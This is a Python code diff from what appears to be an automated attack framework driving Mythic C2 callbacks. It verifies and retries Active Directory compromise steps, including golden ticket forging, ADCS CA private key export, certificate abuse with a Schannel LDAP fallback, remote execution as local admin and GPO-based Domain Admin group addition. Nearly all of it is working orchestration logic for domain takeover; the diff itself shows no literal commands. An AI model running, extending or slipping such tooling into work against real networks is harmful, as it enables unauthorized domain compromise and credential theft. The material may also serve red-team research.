+            verification = capabilities_mod.verify_capability(capability, probe)
+            return probe, verification
+        if capability == "adcs-certificate-auth":
+            allowed_probes = {
+                "extract_adcs_certificate_auth_probe",
+                "extract_account_ticket_cache_probe",
+                "extract_certificate_pkinit_probe",
+                "extract_logon_context_probe",
+                "extract_ticket_import_probe",
+                "extract_ticket_probe",
+            }
+            if expected_probe not in allowed_probes:
+                return None, None
+            if (
+                not allow_preflight
+                and expected_probe == "extract_ticket_probe"
+                and not self._capability_executor_is_current_context_service_proof(command_obj)
+            ):
+                return None, None
+            account = self._capability_account(action, inputs) or "administrator"
+            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
+            proof_marker = self._capability_text(
+                inputs.get("proof_marker")
+                or inputs.get("auth_marker")
+                or getattr(action, "intent", {}).get("proof_marker")
+                or getattr(action, "intent", {}).get("auth_marker")
+            )
+            probe = dict(capabilities_mod.extract_adcs_certificate_auth_probe(
+                output,
+                account,
+                domain,
+                proof_marker,
+            ))
+            probe["callback_id"] = self._capability_text(callback_id)
+            verification = capabilities_mod.verify_capability(capability, probe)
+            return probe, verification
+        if capability == "execute-as-local-admin":
+            if expected_probe != "extract_remote_execution_probe":
+                return None, None
+            target_host = self._capability_target_host(action, inputs)
+            target_domain = self._capability_managed_secret_target_domain(action, inputs)
+            proof_marker = self._capability_text(
+                inputs.get("proof_marker")
+                or getattr(action, "intent", {}).get("proof_marker")
+            )
+            probe = dict(capabilities_mod.extract_remote_execution_probe(
+                output,
+                target_host,
+                target_domain,
+                proof_marker,
+            ))
+            probe["callback_id"] = self._capability_text(callback_id)
+            verification = capabilities_mod.verify_capability(capability, probe)
+            return probe, verification
+        if capability == "adcs-ca-private-key-export":
+            if expected_probe != "extract_adcs_ca_private_key_probe":
+                return None, None
+            target_host = self._capability_target_host(action, inputs)
+            target_domain = self._capability_managed_secret_target_domain(action, inputs)
+            proof_marker = self._capability_text(
+                inputs.get("proof_marker")
+                or inputs.get("export_marker")
+                or getattr(action, "intent", {}).get("proof_marker")
+                or getattr(action, "intent", {}).get("export_marker")
+            )
+            probe = dict(capabilities_mod.extract_adcs_ca_private_key_probe(
+                output,
+                target_host,
+                target_domain,
+                proof_marker,
+            ))
+            probe["callback_id"] = self._capability_text(callback_id)
+            verification = capabilities_mod.verify_capability(capability, probe)
+            return probe, verification
+        if capability == "adcs-esc-certificate-enroll":
+            if expected_probe != "extract_adcs_enrolled_certificate_probe":
+                return None, None
+            account = self._capability_account(action, inputs) or "administrator"
+            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
+            proof_marker = self._capability_text(
+                inputs.get("proof_marker")
+                or inputs.get("enroll_marker")
+                or getattr(action, "intent", {}).get("proof_marker")
+                or getattr(action, "intent", {}).get("enroll_marker")
+            )
+            probe = dict(capabilities_mod.extract_adcs_enrolled_certificate_probe(
+                output,
+                account,
+                domain,
+                proof_marker,
+            ))
+            probe["callback_id"] = self._capability_text(callback_id)
+            verification = capabilities_mod.verify_capability(capability, probe)
+            return probe, verification
+        if capability in {"forge-golden-ticket", "ensure-kerberos-context", "ensure-account-kerberos-context"}:
+            if expected_probe not in {
+                "extract_ticket_probe",
+                "extract_account_ticket_probe",
+                "extract_ticket_cache_probe",
+                "extract_account_ticket_cache_probe",
+            }:
+                return None, None
+            domain = (
+                self._capability_target_domain(action, inputs)
+                or self._capability_domain(action, inputs)
+                or self._capability_source_domain(action, inputs)
+                or self._capability_account_domain(action, inputs)
+            )
+            try:
+                try:
+                    from . import credential_artifacts
+                except ImportError:
+                    import credential_artifacts
+                expected_domain = None if capability == "ensure-account-kerberos-context" else domain
+                probe = dict(credential_artifacts.extract_ticket_probe(output, expected_domain=expected_domain))
+            except Exception:
+                probe = {}
+            probe["callback_id"] = self._capability_text(callback_id)
+            if domain:
+                probe["domain"] = self._capability_text(domain).casefold()
+            if capability == "ensure-account-kerberos-context":
+                account = self._capability_account(action, inputs)
+                if account:
+                    probe["account"] = account
+                if probe.get("tgt_present") and account and account.casefold() in self._capability_text(output).casefold():
+                    probe["account_ticket_present"] = True
+            verification = capabilities_mod.verify_capability(capability, probe)
+            return probe, verification
+        return None, None
+
+    def _capability_executor_merge_probe(self, current: dict | None, update: dict | None) -> dict:
+        """Merge positive verifier facts observed across a multi-command capability run."""
+        merged = dict(current or {})
+        if not isinstance(update, dict):
+            return merged
+        negative_keys = {
+            "access_denied",
+            "artifact_valid",
+            "auth_failed",
+            "bad_domain_sid",
+            "bad_key",
+            "bad_krbtgt_key",
+            "callback_dead",
+            "clock_skew",
+            "error",
+            "exception",
+            "failed",
+            "kdc_rejected",
+            "logon_failure",
+            "logon_context_failed",
+            "network_path_not_found",
+            "service_access_denied",
+            "ticket_error",
+            "ticket_injection_failed",
+            "xml_invalid",
+            "xml_parse_error",
+            "xml_valid",
+        }
+        identity_keys = {
+            "account",
+            "callback",
+            "callback_display_id",
+            "callback_id",
+            "domain",
+            "principal",
+            "realm",
+            "target_domain",
+            "user",
+        }
+        for key, value in update.items():
+            if key in negative_keys:
+                continue
+            if isinstance(value, bool):
+                if value:
+                    merged[key] = True
+                elif key not in merged:
+                    merged[key] = False
+                continue
+            if isinstance(value, list):
+                if not value:
+                    continue
+                existing = merged.get(key)
+                combined = list(existing) if isinstance(existing, list) else []
+                for item in value:
+                    if item not in combined:
+                        combined.append(item)
+                merged[key] = combined
+                continue
+            if isinstance(value, dict):
+                if value:
+                    prior = merged.get(key)
+                    if isinstance(prior, dict):
+                        merged[key] = {**prior, **value}
+                    else:
+                        merged[key] = dict(value)
+                continue
+            text = self._capability_text(value).strip()
+            if not text:
+                continue
+            if key in identity_keys or not self._capability_text(merged.get(key)).strip():
+                merged[key] = value
+        if any(
+            key in merged
+            for key in (
+                "certificate_auth_method",
+                "certificate_auth_status",
+                "pkinit_tgt_present",
+                "schannel_ldap_bind",
+                "ntlm_hash_present",
+                "certificate_auth_proven",
+            )
+        ):
+            method = self._capability_text(merged.get("certificate_auth_method")).casefold()
+            status = self._capability_text(merged.get("certificate_auth_status")).casefold()
+            auth_specific = (
+                bool(merged.get("pkinit_tgt_present"))
+                or bool(merged.get("schannel_ldap_bind"))
+                or bool(merged.get("ntlm_hash_present"))
+                or method in {"pkinit", "schannel-ldap", "schannel_ldap", "certipy", "cert-auth", "certificate-auth"}
+                or status == "ok"
+            )
+            access_signal = (
+                bool(merged.get("service_access_proven"))
+                or bool(merged.get("domain_admin"))
+                or bool(merged.get("schannel_ldap_bind"))
+                or bool(merged.get("ntlm_hash_present"))
+            )
+            merged["certificate_auth_proven"] = bool(auth_specific and access_signal)
+            merged["ticket_valid"] = bool((merged.get("ticket_valid") or merged.get("service_access_proven")) and auth_specific)
+        return merged
+
+    def _capability_transaction_start(self, action, build_payload: dict) -> dict:
+        commands = list(build_payload.get("commands") or []) if isinstance(build_payload, dict) else []
+        artifact_obligations = sorted({
+            self._capability_text(item)
+            for command_obj in commands
+            for item in list(command_obj.get("produces") or [])
+            if self._capability_text(item).casefold().startswith("artifact:")
+        })
+        delayed_effect_obligations = sorted({
+            self._capability_text(item)
+            for command_obj in commands
+            for item in list(command_obj.get("produces") or [])
+            if self._capability_text(item).casefold().startswith("event:")
+        })
+        proof_obligations = sorted({
+            self._capability_text(command_obj.get("expected_probe"))
+            for command_obj in commands
+            if self._capability_executor_is_final_probe(command_obj)
+            and self._capability_text(command_obj.get("expected_probe"))
+        })
+        return {
+            "capability": self._capability_text(getattr(action, "name", "")),
+            "target": self._capability_text(getattr(action, "target", "")),
+            "required_effects": list(getattr(action, "effects", []) or []),
+            "artifact_obligations": artifact_obligations,
+            "delayed_effect_obligations": delayed_effect_obligations,
+            "proof_obligations": proof_obligations,
+            "validated_artifacts": [],
+            "status": "open",
+            "pin_planner": True,
+            "events": [],
+        }
+
+    def _capability_transaction_update_artifact(self, transaction: dict, command_obj: dict, output: str, capabilities_mod) -> None:
+        if not isinstance(transaction, dict):
+            return
+        try:
+            artifact_probe = dict(capabilities_mod.validate_structured_artifacts(output))
+        except Exception as exc:
+            artifact_probe = {
+                "structured_artifact_observed": False,
+                "artifact_error": self._capability_text(exc),
+            }
+        expects_artifact = self._capability_transaction_expects_structured_artifact(command_obj)
+        if not expects_artifact:
+            return
+        observed = artifact_probe.get("structured_artifact_observed") is True
+        artifact_type = self._capability_text(artifact_probe.get("artifact_type") or "structured")
+        event = {
+            "stage": "artifact_validation",
+            "command": self._capability_text(command_obj.get("command")),
+            "expected": bool(expects_artifact),
+            "artifact_type": artifact_type,
+            "observed": bool(observed),
+        }
+        if observed:
+            valid = artifact_probe.get("artifact_valid") is True
+            event["valid"] = valid
+            if artifact_probe.get("xml_parse_error"):
+                event["parse_error"] = self._capability_text(artifact_probe.get("xml_parse_error"))
+            transaction.setdefault("events", []).append(event)
+            if valid:
+                marker = f"artifact:{artifact_type}_validated"
+                validated = transaction.setdefault("validated_artifacts", [])
+                if marker not in validated:
+                    validated.append(marker)
+                return
+            if self._capability_transaction_artifact_failure_is_nonblocking(transaction):
+                event["nonblocking"] = True
+                event["reason"] = self._capability_text(
+                    artifact_probe.get("xml_parse_error")
+                    or artifact_probe.get("artifact_error")
+                    or f"{artifact_type} artifact was syntactically invalid"
+                )
+                transaction.setdefault("artifact_warnings", []).append(event)
+                return
+            transaction["status"] = "artifact_invalid"
+            transaction["pin_planner"] = True
+            transaction["pin_reason"] = self._capability_text(
+                artifact_probe.get("xml_parse_error")
+                or artifact_probe.get("artifact_error")
+                or f"{artifact_type} artifact was syntactically invalid"
+            )
+            transaction["blocker"] = {
+                "stage": "artifact_validation",
+                "artifact_type": artifact_type,
+                "reason": transaction["pin_reason"],
+            }
+            return
+        event["valid"] = False
+        event["reason"] = "expected structured artifact output was not observed"
+        transaction.setdefault("events", []).append(event)
+        if self._capability_transaction_artifact_failure_is_nonblocking(transaction):
+            event["nonblocking"] = True
+            transaction.setdefault("artifact_warnings", []).append(event)
+            return
+        transaction["status"] = "artifact_missing"
+        transaction["pin_planner"] = True
+        transaction["pin_reason"] = event["reason"]
+        transaction["blocker"] = {
+            "stage": "artifact_validation",
+            "artifact_type": artifact_type,
+            "reason": event["reason"],
+        }
+
+    def _capability_transaction_update_verification(self, transaction: dict, command_obj: dict, verification) -> None:
+        if not isinstance(transaction, dict) or verification is None:
+            return
+        verdict = self._capability_text(getattr(verification, "verdict", ""))
+        event = {
+            "stage": "effect_verification",
+            "command": self._capability_text(command_obj.get("command")),
+            "expected_probe": self._capability_text(command_obj.get("expected_probe")),
+            "final_probe": self._capability_executor_is_final_probe(command_obj),
+            "verdict": verdict,
+            "reason": self._capability_text(getattr(verification, "reason", "")),
+        }
+        transaction.setdefault("events", []).append(event)
+        if verdict == "achieved":
+            transaction["status"] = "effect_achieved"
+            transaction["pin_planner"] = False
+            transaction.pop("pin_reason", None)
+            transaction.pop("blocker", None)
+            return
+        if event["final_probe"]:
+            self._capability_transaction_mark_unverified(
+                transaction,
+                event["reason"] or "final verifier did not prove the required effect",
+            )
+
+    def _capability_transaction_record_task_failure(self, transaction: dict, command_obj: dict, issued_item: dict) -> None:
+        if not isinstance(transaction, dict):
+            return
+        reason = self._capability_text(issued_item.get("failure_reason") or "capability command failed")
+        transaction.setdefault("events", []).append({
+            "stage": "command_failure",
+            "command": self._capability_text(command_obj.get("command")),
+            "expected_probe": self._capability_text(command_obj.get("expected_probe")),
+            "reason": reason,
+        })
+        transaction["status"] = "command_failed"
+        transaction["pin_planner"] = True
+        transaction["pin_reason"] = reason
+        transaction["blocker"] = {
+            "stage": "command_failure",
+            "reason": reason,
+        }
+
+    def _capability_transaction_mark_unverified(self, transaction: dict, reason: str) -> None:
+        if not isinstance(transaction, dict):
+            return
+        if self._capability_text(transaction.get("status")) == "effect_achieved":
+            return
+        transaction["status"] = "effect_unverified"
+        transaction["pin_planner"] = True
+        transaction["pin_reason"] = self._capability_text(reason)
+        transaction["blocker"] = {
+            "stage": "effect_verification",
+            "reason": self._capability_text(reason),
+        }
+
+    def _capability_transaction_expects_structured_artifact(self, command_obj: dict) -> bool:
+        produces = {
+            self._capability_text(item).casefold()
+            for item in list(command_obj.get("produces") or [])
+        }
+        if any(item.startswith("artifact:") and item.endswith("_validated") for item in produces):
+            return True
+        purpose = self._capability_text(command_obj.get("purpose")).casefold()
+        return "structured" in purpose and "artifact" in purpose and (
+            "validate" in purpose or "read back" in purpose
+        )
+
+    def _capability_transaction_artifact_failure_is_nonblocking(self, transaction: dict) -> bool:
+        """Do not let setup-artifact warnings preempt a stronger final effect proof.
+
+        A stale or malformed GPO XML readback is useful evidence, but for a DC-scoped
+        Domain Admin group-add the authoritative proof is delayed membership. Wait and
+        poll that final verifier before considering alternate write implementations.
+        """
+        if not isinstance(transaction, dict):
+            return False
+        capability = self._capability_text(transaction.get("capability")).casefold()
+        if capability != "gpo-controlled-system-exec":
+            return False
+        obligations = {
+            self._capability_text(item).casefold()
+            for item in list(transaction.get("proof_obligations") or [])
+        }
+        return "extract_gpo_domain_admin_membership_probe" in obligations
+
+    def _capability_transaction_is_blocked(self, transaction: dict) -> bool:
+        status = self._capability_text(transaction.get("status")).casefold() if isinstance(transaction, dict) else ""
+        return status in {"artifact_invalid", "artifact_missing"}
+
+    def _capability_transaction_failure_reason(self, transaction: dict, fallback: str) -> str:
+        if not isinstance(transaction, dict):
+            return self._capability_text(fallback)
+        reason = self._capability_text(transaction.get("pin_reason"))
+        if reason:
+            return reason
+        blocker = transaction.get("blocker")
+        if isinstance(blocker, dict):
+            reason = self._capability_text(blocker.get("reason"))
+            if reason:
+                return reason
+        return self._capability_text(fallback)
+
+    def _capability_executor_is_current_context_preflight(self, command_obj: dict) -> bool:
+        produces = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("produces") or [])
+        }
+        consumes = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("consumes") or [])
+        }
+        purpose = self._capability_text(command_obj.get("purpose")).casefold()
+        if "kerberos_context_inventory" in produces:
+            return True
+        if "current callback context" in purpose or "current kerberos context" in purpose:
+            return True
+        return (
+            "kerberos_context_inventory" in consumes
+            and "kerberos_logon_context" not in consumes
+            and "kerberos_ticket_imported" not in consumes
+        )
+
+    def _capability_executor_is_current_context_service_proof(self, command_obj: dict) -> bool:
+        produces = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("produces") or [])
+        }
+        consumes = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("consumes") or [])
+        }
+        return "kerberos_service_access_probe" in produces and "kerberos_context_inventory" in consumes
+
+    def _capability_executor_is_final_probe(self, command_obj: dict) -> bool:
+        expected_probe = self._capability_text(command_obj.get("expected_probe")).casefold()
+        produces = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("produces") or [])
+        }
+        consumes = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("consumes") or [])
+        }
+        purpose = self._capability_text(command_obj.get("purpose")).casefold()
+        if expected_probe == "extract_gpo_system_exec_probe":
+            if any(item.startswith("artifact:") and item.endswith("_validated") for item in produces):
+                return False
+            return "event:group_policy_refresh" in consumes or "proof" in purpose
+        final_probe_names = {
+            "extract_adcs_ca_private_key_probe",
+            "extract_adcs_enrolled_certificate_probe",
+            "extract_adcs_certificate_auth_probe",
+            "extract_endpoint_protection_probe",
+            "extract_gpo_domain_admin_membership_probe",
+            "extract_local_admin_access_probe",
+            "extract_managed_local_admin_secret_probe",
+            "extract_remote_execution_probe",
+        }
+        return bool(expected_probe) and (
+            expected_probe in final_probe_names
+            or "kerberos_service_access_probe" in produces
+        )
+
+    def _capability_executor_allows_repeated_probe(self, command_obj: dict) -> bool:
+        if not self._capability_executor_is_final_probe(command_obj):
+            return False
+        return self._capability_command_consumes_delayed_effect(command_obj)
+
+    def _capability_should_retry_adcs_dpapi(self, action, inputs: dict, verification) -> bool:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability != "adcs-ca-private-key-export":
+            return False
+        if not (
+            self._capability_input_bool(inputs, "allow_adcs_dpapi_retry")
+            or self._capability_input_bool(inputs, "allow_sharpdpapi_retry")
+            or self._capability_input_bool(inputs, "adcs_dpapi_fallback")
+        ):
+            return False
+        if self._capability_input_bool(inputs, "adcs_dpapi_retry_attempted"):
+            return False
+        method = self._capability_text(
+            inputs.get("adcs_ca_export_method")
+            or inputs.get("ca_export_method")
+            or inputs.get("export_method")
+        ).casefold()
+        if method in {"sharpdpapi", "dpapi", "machine-dpapi", "machine_dpapi"}:
+            return False
+        verdict = self._capability_text(getattr(verification, "verdict", "")).casefold()
+        reason = self._capability_text(getattr(verification, "reason", "")).casefold()
+        return verdict == "blocked" and "key not exportable" in reason
+
+    def _capability_executor_final_probe_retry_limit(self, inputs: dict, command_obj: dict | None = None) -> int:
+        value = None
+        if isinstance(inputs, dict):
+            for key in ("final_probe_retries", "proof_retry_attempts", "proof_retries"):
+                if key in inputs and inputs.get(key) not in (None, ""):
+                    value = inputs.get(key)
+                    break
+        if value is None:
+            default = "8" if self._capability_command_consumes_delayed_effect(command_obj) else "3"
+            env_key = (
+                "SAGE_CAPABILITY_DELAYED_PROOF_RETRIES"
+                if self._capability_command_consumes_delayed_effect(command_obj)
+                else "SAGE_CAPABILITY_PROOF_RETRIES"
+            )
+            value = os.environ.get(env_key, default)
+        try:
+            count = int(value)
+        except (TypeError, ValueError):
+            count = 3
+        return max(0, min(count, 8))
+
+    def _capability_executor_final_probe_retry_delay(self, inputs: dict, command_obj: dict | None = None) -> float:
+        value = None
+        if isinstance(inputs, dict):
+            for key in ("final_probe_retry_delay_seconds", "proof_retry_delay_seconds", "proof_retry_delay"):
+                if key in inputs and inputs.get(key) not in (None, ""):
+                    value = inputs.get(key)
+                    break
+        if value is None:
+            delayed = self._capability_command_consumes_delayed_effect(command_obj)
+            env_key = (
+                "SAGE_CAPABILITY_DELAYED_PROOF_RETRY_DELAY_SECONDS"
+                if delayed else
+                "SAGE_CAPABILITY_PROOF_RETRY_DELAY_SECONDS"
+            )
+            value = os.environ.get(env_key, "30" if delayed else "3")
+        try:
+            delay = float(value)
+        except (TypeError, ValueError):
+            delay = 3.0
+        return max(0.0, min(delay, 30.0))
+
+    def _capability_command_consumes_delayed_effect(self, command_obj: dict | None) -> bool:
+        if not isinstance(command_obj, dict):
+            return False
+        return any(
+            self._capability_text(item).casefold().startswith("event:")
+            for item in (command_obj.get("consumes") or [])
+        )
+
+    def _capability_should_retry_final_probe(
+        self,
+        command_obj: dict,
+        probe: dict,
+        verification,
+        retry_attempt: int,
+        max_retries: int,
+    ) -> bool:
+        if retry_attempt >= max_retries:
+            return False
+        if not self._capability_executor_is_final_probe(command_obj):
+            return False
+        verdict = self._capability_text(getattr(verification, "verdict", "")).casefold()
+        if verdict == "achieved":
+            return False
+        if not isinstance(probe, dict):
+            return False
+        hard_negative_keys = {
+            "access_denied",
+            "account_locked",
+            "bad_password",
+            "execution_failed",
+            "logon_failure",
+            "network_path_not_found",
+            "rpc_unavailable",
+            "wmi_unavailable",
+        }
+        if any(bool(probe.get(key)) for key in hard_negative_keys):
+            return False
+        produces = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("produces") or [])
+        }
+        consumes = {
+            self._capability_text(item).casefold()
+            for item in (command_obj.get("consumes") or [])
+        }
+        expects_readback = bool(
+            "remote_execution_proof" in produces
+            or "remote_process_created" in consumes
+            or any(item.endswith("_proof") for item in produces)
+        )
+        if expects_readback and probe.get("proof_not_found"):
+            return True
+        consumes_delayed_effect = any(item.startswith("event:") for item in consumes)
+        if consumes_delayed_effect and verdict in {"partial", "pending", "deferred"}:
+            return True
+        return False
+
+    async def _capability_executor_try_gpo_artifact_fallback(
+        self,
+        action,
+        inputs: dict,
+        callback_id: int,
+        timeout: int | None,
+        before_effects: set[str],
+        all_issued: list[dict],
+        materialized_payload: dict | None,
+        prior_transaction: dict,
+    ) -> str | None:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability != "gpo-controlled-system-exec":
+            return None
+        if self._capability_input_bool(inputs, "_gpo_artifact_fallback_attempted"):
+            return None
+        status = self._capability_text(prior_transaction.get("status")).casefold() if isinstance(prior_transaction, dict) else ""
+        if status != "artifact_invalid":
+            return None
+        method = self._capability_text(
+            inputs.get("method")
+            or inputs.get("execution_method")
+            or inputs.get("delivery_method")
+            or getattr(action, "intent", {}).get("method")
+            or getattr(action, "intent", {}).get("execution_method")
+            or getattr(action, "intent", {}).get("delivery_method")
+        ).casefold()
+        if method in {"fallback", "gpp-fallback", "gpp-immediate-task", "gpp-immediate-task-fallback", "manual-gpp"}:
+            return None
+
+        blocker = self._capability_transaction_failure_reason(
+            prior_transaction,
+            "primary GPO structured artifact was syntactically invalid",
+        )
+        fallback_inputs = dict(inputs)
+        fallback_inputs["_gpo_artifact_fallback_attempted"] = True
+        fallback_inputs["method"] = "gpp-immediate-task-fallback"
+        fallback_inputs["primary_failure_observed"] = True
+        fallback_inputs["failure_reason"] = blocker
+        fallback_inputs["gpo_artifact_blocker"] = blocker
+        retry_raw = await self.execute_capability(action, fallback_inputs)
+        try:
+            retry_payload = json.loads(retry_raw)
+        except Exception:
+            retry_payload = {
+                "ok": False,
+                "verdict": "failed",
+                "capability": self._capability_text(getattr(action, "name", "")),
+                "reason": self._capability_text(retry_raw),
+                "issued": [],
+                "recorded_effects": [],
+            }
+        if isinstance(retry_payload, dict):
+            retry_issued = retry_payload.get("issued") if isinstance(retry_payload.get("issued"), list) else []
+            retry_payload["issued"] = self._capability_executor_public_issued(all_issued) + retry_issued
+            retry_payload["gpo_artifact_repair"] = "gpp-immediate-task-fallback"
+            retry_payload["gpo_artifact_blocker"] = blocker
+            retry_payload["primary_transaction"] = prior_transaction
+            if "materialized" not in retry_payload:
+                retry_payload["materialized"] = self._capability_executor_materialized_summary(materialized_payload)
+            if retry_payload.get("recorded_effects") is None:
+                retry_payload["recorded_effects"] = sorted(self._capability_achieved_effects() - before_effects)
+            return json.dumps(retry_payload, sort_keys=True)
+        return None
+
+    async def _capability_executor_try_schannel_fallback(
+        self,
+        action,
+        inputs: dict,
+        callback_id: int,
+        timeout: int | None,
+        capabilities_mod,
+        before_effects: set[str],
+        all_issued: list[dict],
+        materialized_payload: dict | None,
+        prior_transaction: dict,
+        output: str,
+    ) -> str | None:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability != "adcs-certificate-auth":
+            return None
+        if self._capability_input_bool(inputs, "_schannel_fallback_attempted"):
+            return None
+        if self._capability_text(
+            inputs.get("certificate_auth_method")
+            or inputs.get("adcs_certificate_auth_method")
+            or inputs.get("auth_method")
+        ).casefold() in {"schannel", "schannel-ldap", "ldap-schannel", "ldaps", "certificate-ldap"}:
+            return None
+        if not self._capability_executor_pkinit_not_supported(output):
+            return None
+
+        fallback_inputs = dict(inputs)
+        fallback_inputs["_schannel_fallback_attempted"] = True
+        fallback_inputs["certificate_auth_method"] = "schannel-ldap"
+        fallback_inputs["preflight_existing_context"] = False
+        domain = (
+            self._capability_target_domain(action, fallback_inputs)
+            or self._capability_domain(action, fallback_inputs)
+            or self._capability_account_domain(action, fallback_inputs)
+        )
+        explicit_ldap_server = self._capability_text(
+            fallback_inputs.get("ldap_server")
+            or fallback_inputs.get("ldaps_server")
+            or fallback_inputs.get("domain_controller")
+            or fallback_inputs.get("dc")
+        )
+        if not explicit_ldap_server:
+            dc_host = await self._resolve_domain_controller_host(domain)
+            ldap_server = dc_host or domain
+            if ldap_server:
+                fallback_inputs["ldap_server"] = ldap_server
+                fallback_inputs["domain_controller"] = ldap_server
+                source = "BloodHound Domain Controllers membership" if dc_host else "target domain DNS name"
+                fallback_inputs["domain_controller_source"] = f"{source} for {domain}"
+
+        fallback_payload = await self._capability_build_command_payload(action, fallback_inputs)
+        if not fallback_payload.get("ok"):
+            return self._capability_executor_failure_json({
+                "ok": False,
+                "verdict": "failed",
+                "capability": self._capability_text(getattr(action, "name", "")),
+                "reason": fallback_payload.get("reason") or "Schannel LDAP fallback build failed after PKINIT was not supported",
+                "missing": fallback_payload.get("missing", []),
+                "action": asdict(action) if is_dataclass(action) else {},
+                "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                "issued": self._capability_executor_public_issued(all_issued),
+                "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                "pkinit_transaction": prior_transaction,
+                "fallback": "schannel-ldap",
+            }, action, fallback_inputs, callback_id, issued=all_issued, build_payload=fallback_payload)
+
+        fallback_transaction = self._capability_transaction_start(action, fallback_payload)
+        accumulated_probe: dict = {}
+        last_fallback_output = ""
+        for fallback_command in list(fallback_payload.get("commands") or []):
+            unresolved = self._capability_executor_unresolved_placeholders(fallback_command)
+            if unresolved:
+                return self._capability_executor_failure_json({
+                    "ok": False,
+                    "verdict": "failed",
+                    "capability": self._capability_text(getattr(action, "name", "")),
+                    "reason": "Schannel LDAP fallback still has unresolved runtime placeholders",
+                    "missing": sorted(unresolved),
+                    "action": asdict(action) if is_dataclass(action) else {},
+                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                    "issued": self._capability_executor_public_issued(all_issued),
+                    "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+                    "pkinit_transaction": prior_transaction,
+                    "fallback_transaction": fallback_transaction,
+                    "fallback": "schannel-ldap",
+                }, action, fallback_inputs, callback_id, issued=all_issued, build_payload=fallback_payload)
+
+            fallback_item = await self._execute_capability_command(
+                fallback_command,
+                callback_id,
+                timeout,
+            )
+            fallback_item["fallback"] = "schannel-ldap"
+            fallback_item["fallback_reason"] = "PKINIT returned KDC_ERR_PADATA_TYPE_NOSUPP"
+            all_issued.append(fallback_item)
+            fallback_output = self._capability_text(fallback_item.get("_output"))
+            last_fallback_output = fallback_output
+            self._capability_transaction_update_artifact(
+                fallback_transaction,
+                fallback_command,
+                fallback_output,
+                capabilities_mod,
+            )
+            probe, verification = self._capability_executor_verify_output(
+                action,
+                fallback_inputs,
+                callback_id,
+                fallback_output,
+                fallback_command,
+                capabilities_mod,
+            )
+            if verification is not None:
+                if probe:
+                    accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
+                    verification = capabilities_mod.verify_capability(
+                        self._capability_text(getattr(action, "name", "")),
+                        accumulated_probe,
+                    )
+                    probe = dict(accumulated_probe)
+                fallback_item["verify_verdict"] = verification.verdict
+                fallback_item["verify_reason"] = verification.reason
+                self._capability_transaction_update_verification(
+                    fallback_transaction,
+                    fallback_command,
+                    verification,
+                )
+                if verification.verdict == "achieved":
+                    if not self._capability_action_effects_achieved(action):
+                        self.record_capability_result(
+                            action,
+                            probe or accumulated_probe or {},
+                            evidence={
+                                "source": "execute_capability",
+                                "provenance": "run",
+                                "mythic_task_id": fallback_item.get("task_id"),
+                                "callback_id": callback_id,
+                                "command": fallback_item.get("command"),
+                                "fallback": "schannel-ldap",
+                            },
+                        )
+                    after_effects = self._capability_achieved_effects()
+                    return json.dumps({
+                        "ok": True,
+                        "verdict": "achieved",
+                        "capability": self._capability_text(getattr(action, "name", "")),
+                        "reason": verification.reason,
+                        "action": asdict(action) if is_dataclass(action) else {},
+                        "materialized": self._capability_executor_materialized_summary(materialized_payload),
+                        "issued": self._capability_executor_public_issued(all_issued),
+                        "recorded_effects": sorted(after_effects - before_effects),
+                        "achieved_effects": sorted(after_effects),
+                        "stopped_after": "schannel_ldap_fallback_verified_proof",
+                        "pkinit_transaction": prior_transaction,
+                        "transaction": fallback_transaction,
+                        "fallback": "schannel-ldap",
+                    }, sort_keys=True)
+            if self._capability_executor_task_failed(fallback_item):
+                break
+
+        remote_fallback = await self._capability_executor_try_remote_schannel_fallback(
+            action,
+            fallback_inputs,
+            callback_id,
+            timeout,
+            capabilities_mod,
+            before_effects,
+            all_issued,
+            materialized_payload,
+            prior_transaction,
+            fallback_transaction,
+            last_fallback_output,
+        )
+        if remote_fallback is not None:
+            return remote_fallback
+
+        return self._capability_executor_failure_json({
+            "ok": False,
+            "verdict": "blocked" if self._capability_transaction_is_blocked(fallback_transaction) else "failed",
+            "capability": self._capability_text(getattr(action, "name", "")),
+            "reason": self._capability_transaction_failure_reason(
+                fallback_transaction,
+                "Schannel LDAP fallback did not prove certificate authentication",
+            ),
+            "action": asdict(action) if is_dataclass(action) else {},
+            "materialized": self._capability_executor_materialized_summary(materialized_payload),
+            "issued": self._capability_executor_public_issued(all_issued),
+            "recorded_effects": sorted(self._capability_achieved_effects() - before_effects),
+            "pkinit_transaction": prior_transaction,
+            "transaction": fallback_transaction,
+            "stopped_after": fallback_transaction.get("status") or "schannel_ldap_fallback",
+            "fallback": "schannel-ldap",
+        }, action, fallback_inputs, callback_id, issued=all_issued, build_payload=fallback_payload,
+            record_failed=True, failure_probe=accumulated_probe or {})
+
+    async def _capability_executor_try_remote_schannel_fallback(
+        self,
+        action,
+        inputs: dict,
+        callback_id: int,
+        timeout: int | None,
+        capabilities_mod,
+        before_effects: set[str],
+        all_issued: list[dict],
+        materialized_payload: dict | None,
+        prior_transaction: dict,
+        local_schannel_transaction: dict,
+        direct_failure_output: str,
+    ) -> str | None:
+        if self._capability_input_bool(inputs, "_remote_schannel_fallback_attempted"):
+            return None
+        if not self._capability_executor_ldap_unavailable(direct_failure_output):
+            return None
+
+        domain = (
+            self._capability_target_domain(action, inputs)
+            or self._capability_domain(action, inputs)
+            or self._capability_account_domain(action, inputs)
+        )
+        account = self._capability_account(action, inputs) or "administrator"
+        target_host = self._capability_text(
+            inputs.get("ca_host")
+            or getattr(action, "intent", {}).get("ca_host")
+            or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
+        )
+        target_host_short = self._capability_host_short(target_host)
+        target_domain = self._capability_text(domain).casefold()
+        if not target_host_short or not target_domain:
+            return None
+
+        achieved = self._capability_achieved_effects()
